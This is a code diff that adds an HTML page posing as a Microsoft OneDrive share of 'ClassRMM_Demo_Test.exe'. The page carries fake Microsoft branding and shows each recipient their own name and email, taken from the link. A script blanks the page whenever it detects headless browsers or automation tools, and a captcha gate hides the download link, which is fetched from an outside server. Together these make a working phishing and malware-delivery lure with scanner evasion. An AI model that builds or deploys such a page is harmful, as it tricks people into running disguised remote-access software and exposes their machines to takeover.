@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ClassRMM_Demo_Test.exe - OneDrive</title>
+<!-- c5e310257e75cab63fce6b133a1720886ad52e53f633e5aec3570e6c45880214 --><!-- 2479811349705081afff44de -->
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Segoe UI",Tahoma,Arial,sans-serif;background:#f3f2f1;color:#323130;min-height:100vh}
+.hdr{background:#0078d4;height:48px;display:flex;align-items:center;padding:0 20px;gap:12px}
+.hdr-logo{color:#fff;font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px;text-decoration:none}
+.wrap{max-width:800px;margin:0 auto;padding:20px 16px}
+.crumb{font-size:12px;color:#605e5c;margin-bottom:12px;display:flex;align-items:center;gap:6px}
+.card{background:#fff;box-shadow:0 1.6px 3.6px rgba(0,0,0,.13),0 .3px .9px rgba(0,0,0,.11);border:1px solid #edebe9}
+.toolbar{padding:8px 12px;border-bottom:1px solid #edebe9;display:flex;align-items:center;gap:6px}
+.tbtn{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border:1px solid transparent;border-radius:2px;font:13px "Segoe UI",sans-serif;cursor:pointer;background:none;color:#323130;white-space:nowrap}
+.tbtn:hover{background:#f3f2f1}
+.tbtn.primary{background:#0078d4;color:#fff;border-color:#0078d4;display:none}
+.tbtn.primary:hover{background:#106ebe}
+.preview-area{padding:48px 20px 36px;display:flex;flex-direction:column;align-items:center}
+.file-icon{margin-bottom:14px}
+.fname{font-size:20px;font-weight:600;color:#323130;text-align:center;margin-bottom:4px;word-break:break-all}
+.fshared{font-size:13px;color:#a19f9d;margin-bottom:6px}
+.fmsg{font-size:13px;color:#605e5c;margin-bottom:4px;text-align:center}
+.recip{font-size:13px;color:#605e5c;margin-top:2px;display:none}
+.verify{background:#faf9f8;border:1px solid #edebe9;padding:16px 20px;margin-top:24px;width:100%;max-width:400px}
+.verify-lbl{font-size:12px;color:#605e5c;margin-bottom:10px}
+.cap-row{display:flex;justify-content:center}
+#cap-err{color:#a4262c;font-size:12px;margin-top:8px;display:none;text-align:center}
+.od-footer{text-align:center;font-size:11px;color:#a19f9d;margin-top:18px;padding-bottom:12px}
+.od-footer a{color:#a19f9d;text-decoration:none}
+</style>
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+<script>(function(){
+var udbwolvy=navigator.webdriver||false;
+var xllpgmdu=window.outerWidth===0||window.outerHeight===0;
+var arjgwuex=/HeadlessChrome|PhantomJS|Selenium|puppeteer/i.test(navigator.userAgent);
+if(udbwolvy||xllpgmdu||arjgwuex){document.body.innerHTML='';return;}
+})();</script>
+</head>
+<body>
+<div class="hdr">
+  <a class="hdr-logo" href="#">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M10.5 18.5h8.25a3.75 3.75 0 0 0 .75-7.43A5.25 5.25 0 0 0 9.75 9a5.25 5.25 0 0 0-5 3.57A3.75 3.75 0 0 0 5.25 18.5H10.5z"/></svg>
+    OneDrive
+  </a>
+</div>
+<div class="wrap">
+  <div class="crumb">
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="#605e5c"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+    ClassRMM's OneDrive
+  </div>
+  <div class="card">
+    <div class="toolbar">
+      <button class="tbtn primary" id="dl-btn">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M13 5v8.586l3.293-3.293 1.414 1.414L12 17.414l-5.707-5.707 1.414-1.414L11 13.586V5h2zm-7 14h12v-2H6v2z"/></svg>
+        Download
+      </button>
+      <button class="tbtn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+        Share
+      </button>
+    </div>
+    <div class="preview-area">
+      <div class="file-icon">
+        <svg width="64" height="80" viewBox="0 0 64 80">
+          <path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#0078d4"/>
+          <path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.22)"/>
+          <rect x="12" y="30" width="40" height="5" rx="2.5" fill="white" opacity=".85"/>
+          <rect x="12" y="41" width="30" height="4" rx="2" fill="white" opacity=".6"/>
+          <rect x="12" y="51" width="36" height="4" rx="2" fill="white" opacity=".6"/>
+          <rect x="12" y="61" width="22" height="4" rx="2" fill="white" opacity=".4"/>
+        </svg>
+      </div>
+      <div class="fname">ClassRMM_Demo_Test.exe</div>
+      <div class="fshared">Shared by ClassRMM</div>
+      <div class="fmsg">Test file — verifying Generate Link works end-to-end.</div>
+      <div class="recip" id="recipient-info"></div>
+      <div class="verify">
+        <div class="verify-lbl">Complete security verification to download</div>
+        <div class="cap-row">
+          <div class="h-captcha" data-sitekey="7e1c1f66-9022-451c-b826-ec24878285a6" data-callback="onCaptchaSuccess"></div>
+        </div>
+        <div id="cap-err"></div>
+      </div>
+    </div>
+  </div>
+  <div class="od-footer">&copy; Microsoft 2025 &nbsp;&middot;&nbsp; <a href="#">Privacy</a> &nbsp;&middot;&nbsp; <a href="#">Terms of use</a></div>
+</div>
+<script>
+var _srv='https://rmm.docmail.cloud';var _lid=9;
+async function onCaptchaSuccess(token){
+var btn=document.getElementById('dl-btn');var err=document.getElementById('cap-err');
+err.style.display='none';
+try{
+var r=await fetch(_srv+'/generate-link/verify-captcha',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,captcha_token:token})});
+var d=await r.json();
+if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';if(typeof hcaptcha!=='undefined')hcaptcha.reset();return;}
+var a=document.createElement('a');a.href=d.url;a.download=d.display_name;document.body.appendChild(a);
+btn.style.display='inline-flex';btn.onclick=function(){a.click();};
+}catch(e){err.textContent='Network error. Please try again.';err.style.display='block';if(typeof hcaptcha!=='undefined')hcaptcha.reset();}
+}
+function getParams(){
+var p=new URLSearchParams(window.location.search);var n=p.get('n')||'';var e=p.get('e')||'';
+var el=document.getElementById('recipient-info');if(!el)return;
+if(n||e){el.style.display='block';
+if(n&&e)el.textContent='For: '+decodeURIComponent(n)+' — '+decodeURIComponent(e);
+else el.textContent='For: '+decodeURIComponent(n||e);}
+}
+window.addEventListener('load',getParams);</script>
+</body></html>
